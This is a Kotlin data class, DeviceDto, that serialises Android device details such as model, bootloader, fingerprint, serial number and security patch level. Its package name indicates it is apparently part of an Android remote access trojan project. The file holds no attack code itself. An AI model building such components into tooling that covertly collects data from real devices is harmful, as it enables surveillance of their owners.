package com.nqmgaming.androidrat.data.dto

import com.google.gson.annotations.SerializedName

data class DeviceDto(
    @SerializedName("device")
    var device: String? = null,
    @SerializedName("model")
    var model: String? = null,
    @SerializedName("product")
    var product: String? = null,
    @SerializedName("brand")
    var brand: String? = null,
    @SerializedName("hardware")
    var hardware: String? = null,
    @SerializedName("manufacturer")
    var manufacturer: String? = null,
    @SerializedName("board")
    var board: String? = null,
    @SerializedName("bootloader")
    var bootloader: String? = null,
    @SerializedName("display")
    var display: String? = null,
    @SerializedName("fingerprint")
    var fingerprint: String? = null,
    @SerializedName("host")
    var host: String? = null,
    @SerializedName("_id")
    var id: String? = null,
    @SerializedName("id")
    var idApp: String? = null,
    @SerializedName("tags")
    var tags: String? = null,
    @SerializedName("type")
    var type: String? = null,
    @SerializedName("user")
    var user: String? = null,
    @SerializedName("version")
    var version: String? = null,
    @SerializedName("sdk")
    var sdk: Int? = null,
    @SerializedName("securityPatch")
    var securityPatch: String? = null,
    @SerializedName("incremental")
    var incremental: String? = null,
    @SerializedName("codename")
    var codename: String? = null,
    @SerializedName("baseOs")
    var baseOs: String? = null,
    @SerializedName("previewSdk")
    var previewSdk: Int? = null,
    @SerializedName("radioVersion")
    var radioVersion: String? = null,
    @SerializedName("serial")
    var serial: String? = null,
    @SerializedName("time")
    var time: Long? = null
)
